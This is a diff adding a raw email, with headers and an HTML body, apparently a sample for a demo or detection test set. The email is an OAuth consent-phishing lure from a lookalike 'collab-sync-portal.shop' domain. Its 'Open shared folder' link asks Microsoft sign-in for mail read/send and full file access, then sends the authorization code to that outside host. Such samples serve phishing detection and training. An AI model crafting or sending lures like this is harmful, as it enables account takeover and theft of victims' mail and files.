@@ -1,0 +1,23 @@
+Return-Path: <share@collab-sync-portal.shop>
+Received: from mx02.meridian-demo.local (10.20.4.12) by exch01.meridian-demo.local (10.20.4.30)
+	with Microsoft SMTP Server id 15.2.1544.4; Tue, 28 Jul 2026 01:12:05 +0000
+Received: from collab-sync-portal.shop (collab-sync-portal.shop [104.21.9.44])
+	by mx02.meridian-demo.local (Postfix) with ESMTPS id 2C7710D5F1; Tue, 28 Jul 2026 01:12:00 +0000
+Authentication-Results: exch01.meridian-demo.local;
+	spf=pass smtp.mailfrom=collab-sync-portal.shop; dkim=pass header.d=collab-sync-portal.shop;
+	dmarc=pass action=none header.from=collab-sync-portal.shop
+From: "Collab Sync" <share@collab-sync-portal.shop>
+To: a.mehta@meridian-demo.local
+Subject: Anita, r.iyer shared "Board Pack Q3" with you
+Date: Tue, 28 Jul 2026 01:12:00 +0000
+Message-ID: <cfd1ad555e7fb890c0de244d@collab-sync-portal.shop>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="=_mixed_0001"
+
+This is a multi-part message in MIME format.
+--=_mixed_0001
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+
+<html><body><p>r.iyer@meridian-demo.local shared a folder with you.</p><p><a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9f8c2a41-77bd-4f2e-b3aa-0e91d4c7ff10&amp;response_type=code&amp;redirect_uri=https%3A%2F%2Fcollab-sync-portal.shop%2Fcb&amp;scope=offline_access%20Mail.ReadWrite%20Mail.Send%20Files.ReadWrite.All%20User.Read">Open shared folder</a></p></body></html>
+--=_mixed_0001--
